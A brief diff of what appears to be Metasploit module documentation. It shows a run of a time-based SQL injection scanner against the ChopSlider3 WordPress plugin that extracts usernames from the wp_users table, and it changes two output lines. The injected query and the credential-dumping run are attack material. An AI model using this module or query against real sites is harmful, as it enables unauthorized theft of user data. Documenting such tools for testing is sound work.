@@ -48,7 +48,7 @@ resource (chopslider.rb)> set count 3
 count => 3
 resource (chopslider.rb)> run
 [*] Version detected: 3.4
-[+] Vulnerable version detected
+[+] Vulnerable version of ChopSlider3 detected
 [*] Enumerating Usernames
 [*] {SQLi} Executing (select group_concat(qlJEzvIJY) from (select cast(ifnull(user_login,'') as binary) qlJEzvIJY from wp_users limit 3) DSKc)
 [*] {SQLi} Time-based injection: expecting output of length 19
@@ -66,7 +66,7 @@ resource (chopslider.rb)> run
 
 [*] Scanned 1 of 1 hosts (100% complete)
 [*] Auxiliary module execution completed
-msf6 auxiliary(scanner/http/wp_chopslider_id_sqli) > creds
+msf auxiliary(scanner/http/wp_chopslider_id_sqli) > creds
 Credentials
 ===========
 
